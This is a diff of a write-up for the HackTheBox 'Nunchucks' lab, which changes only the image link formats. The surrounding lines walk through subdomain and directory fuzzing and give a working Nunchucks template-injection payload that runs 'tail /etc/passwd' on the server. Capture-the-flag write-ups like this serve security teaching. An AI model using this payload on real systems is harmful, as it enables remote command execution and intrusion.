@@ -10,7 +10,7 @@ wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/wordlists/SecLists/Discovery/D
 we can find "store.nunchucks.htb"
 
 3, enumerate the website 
-![[Pasted image 20240720090328.png]]
+![](images/Pasted%20image%2020240720090328.png)
 It is clear that registration is closed.
 So try to find something useful in the fuzzing the web-contents.
  ffuf -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fs 45
@@ -25,7 +25,7 @@ Let's enumerate the web of store.nunchucks.htb
 We only find the /asserts
 So try to find some hints from the index page
 There is a POST request from the email submit,let's exploit it by using burpsuite
-![[Pasted image 20240720092923.png]]
+![](images/Pasted%20image%2020240720092923.png)
 Successfully identity the SSTI ! (nunchucks template injection)
 pyload:
  {"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@qq.com1"}
